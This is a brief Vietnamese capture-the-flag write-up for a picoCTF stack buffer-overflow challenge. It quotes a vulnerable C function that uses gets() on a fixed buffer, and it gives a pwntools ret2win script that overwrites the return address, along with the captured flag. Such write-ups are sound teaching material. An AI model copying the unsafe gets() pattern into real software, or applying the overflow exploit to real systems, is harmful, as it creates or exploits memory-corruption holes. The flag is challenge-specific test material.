# khai thác
đọc source ta thấy có lỗi BOF ở hàm vuln và không có canry
```c
#define BUFFSIZE 64
void vuln(){
  char buf[BUFFSIZE];
  gets(buf);
}
```
có cả flag trong file nên ta sẽ tìm offset và ret2win
```python
from pwn import *

p = remote("saturn.picoctf.net", 61404)

payload = b"a" * 72 + p64(0x000000000040123b)

p.sendline(payload)
p.interactive() 
# picoCTF{b1663r_15_b3773r_11c407bc}
```